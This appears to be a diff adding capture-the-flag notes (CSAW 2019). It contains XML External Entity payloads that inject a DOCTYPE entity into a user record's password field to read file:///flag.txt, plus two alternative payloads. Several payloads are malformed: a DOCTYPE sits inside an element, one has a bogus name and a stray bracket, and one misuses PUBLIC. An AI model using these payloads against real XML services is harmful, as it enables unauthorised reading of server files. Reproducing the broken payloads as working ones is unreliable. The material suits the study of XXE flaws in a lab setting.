@@ -1,0 +1,33 @@
+# Payload example obtained from the website, decide on the XXE payload
+
+<users>
+  <user>
+    <username>alice</username>
+    <password>passwd1</password>
+    <name>Alice</name>
+    <email>alice@fakesite.com</email>
+    <group>CSAW2019</group>
+  </user>
+  <user>
+    <username>bob</username>
+    <password>passwd2</password>
+    <name> Bob</name>
+    <email>bob@fakesite.com</email>
+    <group>CSAW2019</group>
+  </user>
+  <user>
+    <username>trudy</username>
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+    <password>&xxe;</password>
+    <name>Trudy</name>
+    <email>bob@fakesite.com</email>
+    <group>CSAW2019</group>
+  </user>
+</users>
+
+
+# Possible XXE payloads
+<!DOCTYPE foo [ <!ENTITY xxe PUBLIC "file:///flag.txt"> ]>
+
+<!DOCTYPE {0xdfbf} SYSTEM "file:///flag.txt"> ]>
+
